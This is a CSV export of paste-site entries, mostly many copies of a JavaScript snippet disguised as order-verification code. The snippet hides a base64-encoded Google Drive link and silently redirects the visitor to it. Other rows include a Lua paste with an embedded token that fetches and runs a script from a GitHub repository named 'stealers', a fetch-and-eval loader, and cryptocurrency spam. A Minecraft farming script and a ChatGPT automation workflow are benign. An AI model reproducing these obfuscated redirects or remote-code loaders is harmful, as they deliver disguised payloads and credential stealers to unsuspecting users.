id,title,username,language,date,content
T6WAzZMk,Order.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 05:50:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/743/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LrF0ySrW,Market.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 05:35:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/821/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zqFD24tD,Untitled,iLoveToWatch,JavaScript,Sunday 30th of March 2025 05:20:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/209/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YZ98T3SU,Products.js,iLoveToWatch,JavaScript,Sunday 30th of March 2025 05:04:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/392/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sX5AEtLR,Untitled,SyonDaSyip,Lua,Sunday 30th of March 2025 04:56:52 AM CDT,"token = ""MTM1NTU4NTg4NjY0MDY3Mjk5MA.Gi8bkW.R4pDqO4dG7EQkrQnhG5Fvvs1MDAVj23-nBWk0I""
channelId = ""1355582545198059795""
loadstring(game:HttpGet(""https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/autojoiner.lua""))()"
j1GmEnVE,Generating,Nil000,Email,Sunday 30th of March 2025 04:26:40 AM CDT,"Mass Bitcoin address (with private key) generation!
Email me at: bitcryptomann@gmail.com"
FsWFyWVC,Creating,Nil000,Email,Sunday 30th of March 2025 04:26:37 AM CDT,"Creating your own cryptocurrency!
Email me at: bitcryptomann@gmail.com"
ND75H63X,Untitled,iLoveToWatch,JavaScript,Sunday 30th of March 2025 04:18:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/081/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
giuv8pxi,connect to lime.radio,LimePaste888,JavaScript,Sunday 30th of March 2025 04:05:59 AM CDT,"fetch(""https://api.github.com/repos/LimeSlime888/lime.radio/contents/client.js?raw=true"").then(e=>e.json()).then(e=>eval(atob(e.content)))"
7ySLLRcj,Products.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 04:02:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/418/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yaFpNkEh,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 03:16:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/542/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
b64QG5ra,Ask ChatGPT Context Menu,nitr0gear,JSON,Sunday 30th of March 2025 02:52:44 AM CDT,"{""extVersion"":""1.29.9"",""name"":""Ask ChatGPT"",""icon"":""riGlobalLine"",""table"":[],""version"":""1.29.9"",""drawflow"":{""nodes"":[{""id"":""D6X-5t_1qMDpJNWBxik0Q"",""type"":""BlockBasic"",""initialized"":false,""position"":{""x"":21.538461538461547,""y"":204.9230769230769},""data"":{""activeInInput"":false,""contextMenuName"":"""",""contextTypes"":[],""date"":"""",""days"":[],""delay"":5,""description"":"""",""disableBlock"":false,""interval"":60,""isUrlRegex"":false,""observeElement"":{""baseElOptions"":{""attributeFilter"":[],""attributes"":false,""characterData"":false,""childList"":true,""subtree"":false},""baseSelector"":"""",""matchPattern"":"""",""selector"":"""",""targetOptions"":{""attributeFilter"":[],""attributes"":false,""characterData"":false,""childList"":true,""subtree"":false}},""parameters"":[],""preferParamsInTab"":false,""settings"":{""blockTimeout"":0,""debugMode"":false},""shortcut"":"""",""time"":""00:00"",""triggers"":[{""data"":{""activeInInput"":false,""contextMenuName"":"""",""contextTypes"":[],""date"":"""",""days"":[],""delay"":5,""description"":"""",""disableBlock"":false,""interval"":60,""isUrlRegex"":false,""observeElement"":{""baseElOptions"":{""attributeFilter"":[],""attributes"":false,""characterData"":false,""childList"":true,""subtree"":false},""baseSelector"":"""",""matchPattern"":"""",""selector"":"""",""targetOptions"":{""attributeFilter"":[],""attributes"":false,""characterData"":false,""childList"":true,""subtree"":false}},""parameters"":[],""preferParamsInTab"":false,""shortcut"":"""",""time"":""00:00"",""type"":""manual"",""url"":""""},""id"":""3MHGp"",""type"":""manual""},{""data"":{""contextMenuName"":""Ask ChatGPT"",""contextTypes"":[]},""id"":""foAmX"",""type"":""context-menu""}],""type"":""manual"",""url"":""""},""label"":""trigger""},{""id"":""i2l3ews"",""type"":""BlockBasic"",""initialized"":false,""position"":{""x"":331.53846153846143,""y"":204.6153846153846},""data"":{""active"":true,""customUserAgent"":false,""description"":"""",""disableBlock"":false,""inGroup"":false,""tabZoom"":1,""updatePrevTab"":false,""url"":""https://chatgpt.com"",""userAgent"":"""",""waitTabLoaded"":true},""label"":""new-tab""},{""id"":""uvobchd"",""type"":""BlockBasic"",""initialized"":false,""position"":{""x"":342.30769230769226,""y"":382.3076923076923},""data"":{""$breakpoint"":false,""assignVariable"":false,""clearValue"":false,""dataColumn"":"""",""delay"":"""",""description"":"""",""disableBlock"":false,""events"":[],""findBy"":""cssSelector"",""getValue"":false,""markEl"":false,""multiple"":false,""onError"":{""dataToInsert"":[],""enable"":false,""errorMessage"":"""",""insertData"":false,""retry"":false,""retryInterval"":2,""retryTimes"":1,""toDo"":""error""},""optionPosition"":""1"",""saveData"":false,""selectOptionBy"":""value"",""selected"":true,""selector"":""div#prompt-textarea"",""settings"":{""blockTimeout"":0,""debugMode"":false},""type"":""text-field"",""value"":""{{variables.$ctxTextSelection}}"",""variableName"":"""",""waitForSelector"":true,""waitSelectorTimeout"":5000},""label"":""forms""}],""edges"":[{""id"":""vueflow__edge-D6X-5t_1qMDpJNWBxik0QD6X-5t_1qMDpJNWBxik0Q-output-1-i2l3ewsi2l3ews-input-1"",""type"":""custom"",""source"":""D6X-5t_1qMDpJNWBxik0Q"",""target"":""i2l3ews"",""sourceHandle"":""D6X-5t_1qMDpJNWBxik0Q-output-1"",""targetHandle"":""i2l3ews-input-1"",""updatable"":true,""selectable"":true,""data"":{},""label"":"""",""markerEnd"":""arrowclosed"",""sourceX"":237.53846153846155,""sourceY"":240.92307222806488,""targetX"":307.5384756234975,""targetY"":240.6153799203726},{""id"":""vueflow__edge-i2l3ewsi2l3ews-output-1-uvobchduvobchd-input-1"",""type"":""custom"",""source"":""i2l3ews"",""target"":""uvobchd"",""sourceHandle"":""i2l3ews-output-1"",""targetHandle"":""uvobchd-input-1"",""updatable"":true,""selectable"":true,""data"":{},""label"":"""",""markerEnd"":""arrowclosed"",""class"":""connected-edges"",""sourceX"":547.5384380634014,""sourceY"":240.6153799203726,""targetX"":318.3076829176682,""targetY"":418.3076641376202}],""position"":[0,0],""zoom"":1.3,""viewport"":{""x"":0,""y"":0,""zoom"":1.3}},""settings"":{""publicId"":"""",""restartTimes"":3,""notification"":true,""tabLoadTimeout"":30000,""inputAutocomplete"":true,""insertDefaultColumn"":false,""defaultColumnName"":""column"",""blockDelay"":0,""debugMode"":false,""execContext"":""popup"",""executedBlockOnWeb"":false,""onError"":""stop-workflow"",""reuseLastState"":false,""saveLog"":true},""globalData"":""{\n\t\""key\"": \""value\""\n}"",""description"":""Ask ChatGPT"",""includedWorkflows"":{}}"
DS1acfnN,Sugarcane,sweetjebus,Lua,Sunday 30th of March 2025 02:47:02 AM CDT,"t = gomychild
while( t == gomychild )
do
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 2,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 1,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 2,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 1,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 2,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 1,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 2,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 1,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnLeft()
	for i = 21,1,-1 
	do 
	   turtle.forward()
		turtle.dig()
	end
	turtle.turnRight()
    for i = 2,1,-1 
    do 
       turtle.forward()
        turtle.dig()
    end
    turtle.turnRight()
    for i = 21,1,-1 
    do 
       turtle.forward()
        turtle.dig()
    end
	turtle.turnRight()
	for i = 15,1,-1 
	do 
	   turtle.forward()
	end
	os.sleep(60)
 turtle.turnRight()	
end
"
Ak43HZDe,Order.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 02:45:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/540/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q00Mb1Fb,Market.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 02:30:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/633/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
